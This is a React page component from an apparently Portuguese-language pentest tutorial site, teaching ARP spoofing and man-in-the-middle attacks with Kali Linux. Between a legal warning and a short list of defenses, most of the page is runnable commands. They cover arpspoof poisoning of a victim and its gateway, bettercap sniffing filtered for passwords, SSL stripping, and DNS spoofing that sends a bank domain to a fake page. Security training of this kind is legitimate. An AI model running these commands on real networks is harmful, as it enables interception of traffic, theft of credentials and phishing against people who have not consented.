import { PageContainer } from "@/components/layout/PageContainer";
  import { AlertBox } from "@/components/ui/AlertBox";
  import { CodeBlock } from "@/components/ui/CodeBlock";

  export default function ARPSpoofing() {
    return (
      <PageContainer
        title="ARP Spoofing & Man-in-the-Middle"
        subtitle="Intercepte e manipule tráfego de rede em redes locais usando envenenamento de ARP."
        difficulty="avancado"
        timeToRead="14 min"
      >
        <AlertBox type="danger" title="Ilegal em redes sem autorização">
          ARP Spoofing em redes que você não possui ou não tem autorização explícita é crime
          sob a Lei 12.737/2012 (Brasil). Use apenas em labs isolados.
        </AlertBox>

        <h2>Como Funciona o ARP Spoofing</h2>
        <p>
          ARP (Address Resolution Protocol) mapeia IPs para endereços MAC. 
          O protocolo não tem autenticação — qualquer host pode enviar respostas ARP falsas.
          Um ataque MITM faz a vítima achar que o atacante é o gateway, e o gateway achar que
          o atacante é a vítima, colocando o atacante no meio da comunicação.
        </p>

        <h2>Configurar o Kali para Forwarding</h2>
        <CodeBlock language="bash" code={'# Habilitar IP forwarding (ESSENCIAL — sem isso você derruba a conexão da vítima)\necho 1 > /proc/sys/net/ipv4/ip_forward\n\n# Verificar\ncat /proc/sys/net/ipv4/ip_forward\n\n# Permanente (sobrevive ao reboot)\necho "net.ipv4.ip_forward = 1" >> /etc/sysctl.conf\nsysctl -p'} />

        <h2>arpspoof — Ferramenta Básica</h2>
        <CodeBlock language="bash" code={'# Instalar\nsudo apt install dsniff -y\n\n# Identificar gateway e vítima\nip route show  # gateway padrão\nnmap -sn 192.168.1.0/24  # hosts na rede\n\n# Terminal 1 — envenenar vítima (fazer ela achar que o atacante é o gateway)\nsudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1\n# -t: alvo (vítima)\n# ip final: quem fingimos ser (gateway)\n\n# Terminal 2 — envenenar gateway (fazer ele achar que o atacante é a vítima)\nsudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.100\n\n# Terminal 3 — capturar tráfego\nsudo tcpdump -i eth0 -w /tmp/captura.pcap host 192.168.1.100'} />

        <h2>Bettercap — MITM Moderno</h2>
        <CodeBlock language="bash" code={'# Instalar (já no Kali)\nsudo apt install bettercap -y\n\n# Iniciar console interativo\nsudo bettercap -iface eth0\n\n# Dentro do bettercap:\nbettercap > net.probe on        # descobrir hosts\nbettercap > net.show            # mostrar hosts\nbettercap > set arp.spoof.targets 192.168.1.100\nbettercap > arp.spoof on        # iniciar MITM\nbettercap > net.sniff on        # capturar tráfego\n\n# Capturar credenciais HTTP\nbettercap > set net.sniff.regexp .*password.*\nbettercap > net.sniff on\n\n# Interface web (opcional)\nbettercap > ui.update && ui.on'} />

        <h2>SSL Stripping com Bettercap</h2>
        <CodeBlock language="bash" code={'# SSL Stripping: forçar downgrade HTTPS → HTTP\n# (funciona em sites sem HSTS)\n\nbettercap > set arp.spoof.targets 192.168.1.100\nbettercap > arp.spoof on\nbettercap > https.proxy on\nbettercap > set https.proxy.sslstrip true\nbettercap > net.sniff on\n\n# Capturar credenciais\nbettercap > events.ignore net.sniff.tcp\nbettercap > events.show'} />

        <h2>DNS Spoofing</h2>
        <CodeBlock language="bash" code={'# Redirecionar domínio para IP falso durante MITM\n\n# Com Bettercap\nbettercap > set dns.spoof.domains banco.com.br,google.com\nbettercap > set dns.spoof.address 192.168.1.50  # IP da página falsa\nbettercap > arp.spoof on\nbettercap > dns.spoof on\n\n# Com dnsspoof (dsniff)\necho "192.168.1.50  banco.com.br" > /tmp/dns_spoof.txt\nsudo dnsspoof -i eth0 -f /tmp/dns_spoof.txt'} />

        <AlertBox type="warning" title="Proteções modernas">
          HTTPS/TLS, HSTS (HTTP Strict Transport Security), DNSSEC e detecção de ARP dinâmico (DAI)
          em switches gerenciados protegem contra ARP Spoofing. Em redes modernas, o impacto é limitado.
        </AlertBox>
      </PageContainer>
    );
  }
  